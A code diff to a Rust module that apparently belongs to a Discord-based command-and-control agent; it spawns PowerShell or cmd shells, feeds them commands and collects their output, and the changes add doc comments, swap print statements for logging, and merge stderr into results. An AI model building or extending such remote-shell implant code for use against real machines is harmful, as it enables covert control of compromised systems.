@@ -11,6 +11,7 @@ use tokio::{
 
 use lazy_static::lazy_static;
 use regex::Regex;
+use tracing::{info, warn, error};
 
 #[derive(Clone, PartialEq, Eq, Debug, Copy)]
 pub enum ShellType {
@@ -19,6 +20,8 @@ pub enum ShellType {
 }
 
 impl ShellType {
+
+    /// Returns a string representing the shell type.
     pub fn as_str(&self) -> &str {
         match self {
             ShellType::Powershell => "powershell.exe",
@@ -26,7 +29,7 @@ impl ShellType {
         }
     }
 
-    // This gets rid of the command delimter from our stdout
+    /// Formats the output `s` by removing the command delimter via the `.replace()` method.
     fn format_output(&self, s: &str) -> String {
         match self {
             ShellType::Powershell => s.replace("; echo ___CMDDELIM___", ""),
@@ -36,7 +39,16 @@ impl ShellType {
 
     /// Handles writing the specified `command` to the standard input of the underlying shell process,
     /// based on the `ShellType` and the provided `handler`.
-    /// Returns `Ok(())` if the write operation is successful, or an error of type `DiscordC2Error` if there was a problem.
+    ///
+    /// ### Arguments
+    ///
+    /// * `handler` - A reference to the `ProcessHandler` instance.
+    /// * `command` - The command to write to the standard input.
+    ///
+    /// 
+    /// ### Returns
+    ///
+    /// `Ok(())` if the write operation is successful, or an error of type `DiscordC2Error` if there was a problem.
     async fn handle_stdin(
         &self,
         handler: &ProcessHandler,
@@ -82,6 +94,15 @@ impl ShellType {
         }
     }
 
+    /// Retrieves the current working directory based on the shell type.
+    ///
+    /// ### Arguments
+    ///
+    /// * `handler` - A reference to the `ProcessHandler` instance.
+    ///
+    /// ### Returns
+    ///
+    /// The current working directory as a `String`, or an error of type `DiscordC2Error` if there was a problem.
     async fn get_current_dir(&self, handler: &ProcessHandler) -> Result<String, DiscordC2Error> {
         let mut process = handler.process.lock().await;
 
@@ -137,7 +158,6 @@ impl ShellType {
         }
 
         let formatted_output = stdin_success?.format_output(&output);
-        println!("formatted_output: {}", formatted_output);
         Ok(formatted_output)
     }
 }
@@ -166,6 +186,7 @@ impl ProcessHandler {
     async fn new(shell_type: ShellType) -> Result<Self, DiscordC2Error> {
         // Open a new shell process based on the provided `shell_type`
         let process = open_shell(shell_type).await?;
+        info!("Successfully instantiated a new shell of type: {}", shell_type.as_str());
 
         // Create a new `ProcessHandler` instance with the shell type and the process wrapped in an `Arc<Mutex>`
         Ok(ProcessHandler {
@@ -209,22 +230,21 @@ impl ProcessHandler {
                     Ok(line_result) => match line_result {
                         Ok(Some(line)) => {
                             if !line.is_empty() {
-                                eprintln!("stderr: {}", line);
                                 output.push_str(&line);
                                 output.push('\n');
                             }
                         }
                         Ok(None) => {
-                            eprintln!("Stopped reading stderr");
+                            info!("Stopped reading stderr");
                             break;
                         }
                         Err(e) => {
-                            eprintln!("Error reading stderr: {}", e);
+                            error!("Error reading stderr: {}", e);
                             break;
                         }
                     },
                     Err(_) => {
-                        eprintln!("Timeout while reading stderr");
+                        warn!("Timeout while reading stderr");
                         break;
                     }
                 }
@@ -238,19 +258,23 @@ impl ProcessHandler {
         }
 
         let stderr = read_stderr(Arc::clone(&self.process)).await;
-        println!("stderr: {:?}", stderr);
-
+     
         let mut process = self.process.lock().await;
 
         // Read the process's stdout line by line
         let stdout_reader = BufReader::new(process.stdout.as_mut().unwrap());
         let mut out_lines = stdout_reader.lines();
+
         while let Some(line) = out_lines.next_line().await? {
             if !line.contains("echo") && line.contains("___CMDDELIM___") {
                 break;
             }
             output.push_str(&line);
             output.push('\n');
+        }
+
+        if stderr.is_some() {
+            output.push_str(stderr.unwrap().as_str());
         }
 
         let formatted_output = self.shell_type.format_output(&output);
